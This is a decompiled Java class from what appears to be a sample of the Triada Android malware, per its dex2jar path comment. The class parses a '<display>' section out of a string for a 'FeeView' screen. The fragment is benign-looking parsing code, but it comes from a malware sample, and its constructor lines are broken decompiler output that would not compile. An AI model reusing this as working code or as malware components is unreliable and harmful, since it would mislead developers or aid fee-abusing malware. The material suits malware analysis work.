package com.android.essdk.eyou;

import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.ui.FeeView;
import java.io.StringReader;
import java.util.List;

public class i {
  private static i b;
  
  List a = null;
  
  public static i a() {
    if (b == null)
      b = new i(); 
    return b;
  }
  
  public StringReader a(String paramString) {
    try {
      if (paramString.contains("<display>") && paramString.contains("</display>")) {
        String str = paramString.toString();
        FeeView.c = str.substring(str.indexOf("<display>") + "<display>".length(), str.indexOf("</display>"));
        StringReader stringReader = new StringReader();
        this(paramString.substring(0, paramString.indexOf("<display>")));
        return stringReader;
      } 
    } catch (Exception exception) {
      b.f("", "解析HTML错误" + exception.getMessage());
      exception.printStackTrace();
    } 
    return null;
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/i.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */